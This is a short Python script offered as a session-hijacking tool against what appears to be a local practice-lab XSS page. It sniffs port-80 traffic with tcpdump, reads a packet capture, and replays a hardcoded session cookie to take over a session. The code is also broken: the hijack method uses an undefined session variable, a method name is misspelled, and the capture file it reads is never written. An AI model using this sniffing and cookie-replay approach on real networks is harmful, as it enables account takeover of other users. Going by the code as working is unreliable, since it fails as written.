```python
import subprocess
import requests

class SessionHijacking:
    """
    Packet sniffing using tcpdump to hijack sessions
    Description: Contains methods for session hijacking focusing on http://127.0.0.1:81/vulnerabilities/xss_d/
    """

    def sniff_packets(self):
        proc = subprocess.Popen(['tcpdump', '-i', 'eth0', 'port', '80'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = proc.communicate()
        print(stdout)

    def analyze_packets(self):
        proc = subprocess.Popen(['tcpdump', '-r', 'captured.pcap'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        stdout, stderr = proc.communicate()
        print(stdout)

    def hiijack_session(self):
        s.headers.update({'Cookie': 'session=1234abc'})
        response = s.get('http://127.0.0.1:81/vulnerabilities/xss_d/')
        print(response.text)

def main():
    sh = SessionHijacking()
    with requests.Session() as s:
        sh.sniff_packets()
        sh.analyze_packets()
        sh.hiijack_session()

if __name__ == "__main__":
    main()
```  
